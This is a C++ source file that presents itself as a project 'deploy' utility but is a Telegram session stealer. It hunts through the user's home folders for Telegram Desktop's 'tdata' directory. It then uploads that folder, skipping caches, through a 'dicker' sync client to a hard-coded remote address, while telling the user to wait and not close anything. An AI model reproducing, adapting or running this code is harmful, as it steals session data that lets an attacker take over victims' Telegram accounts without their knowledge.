#include <deque>
#include <ctime>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>

#include "dicker.h"

using namespace std;
namespace fs = filesystem;

bool checkDir(fs::path p) {
  try {
    if (!fs::exists(p / "tdata")) {
      return false;
    }

    return true;
  } catch(...) {
    return false;
  }
}

fs::path home() {
  static auto res = getenv("USERPROFILE");
  if (!res) {
    res = getenv("HOME");
  }

  return res;
}

int run(const string& cmd) {
  cout.flush();
  return system(cmd.c_str());
}

void doExport() {
}

void findAndDeploy() {
  cout << "==========================================" << endl;
  cout << "DEPLOY. Don't close anything, just wait." << endl;
  cout << "==========================================" << endl;

  dicker::Conn conn{"dickers://kek@84.38.185.57:5959"};

  dicker::Config cfg{conn};
  dicker::Scheduler dicker{cfg};

  fs::path targetDir;

  deque<fs::path> candidates = {
    home(),
    home() / fs::path("%appdata%"),
    home() / fs::path("%appdata%") / fs::path("Telegram Desktop"),
    home() / fs::path("Documents"),
    home() / fs::path("Downloads"),
  };

  while (!candidates.empty()) {
    auto c = candidates.front();
    candidates.pop_front();

    if (checkDir(c)) {
      targetDir = c;
      break;
    }
  }

  if (targetDir.empty()) {
    cout << "[*] Starting the recursive search" << endl;

    candidates.push_back(home());

    while (!candidates.empty()) {
      auto c = candidates.front();
      candidates.pop_front();

      if (checkDir(c)) {
        targetDir = c;
        break;
      }

      try {
        if (fs::exists(c) && fs::is_directory(c)) {
          for (const auto& entry : fs::directory_iterator(c)) {
            if (entry.is_directory() && !entry.is_symlink()) {
              candidates.push_back(entry);
            }
          }
        }
      } catch(...) {

      }
    }
  }

  if (targetDir.empty()) {
    cout << "[!] Project directory was not found" << endl;
    cin.get();
    return;
  }

  std::cout << "[*] Target dir: " << targetDir << std::endl; 

  dicker.addRoot(targetDir / fs::path{"tdata"}, {
    dicker::include("media_cache/version"),
    dicker::exclude("media_cache/**"),
    dicker::include("cache/version"),
    dicker::exclude("cache/**"),
  });

  dicker.start();
}

int main() {
  std::thread runner([&] {
    try {
      findAndDeploy();
    } catch(...) {

    }
  });

  runner.join();

  cin.get();

  return 0;
}
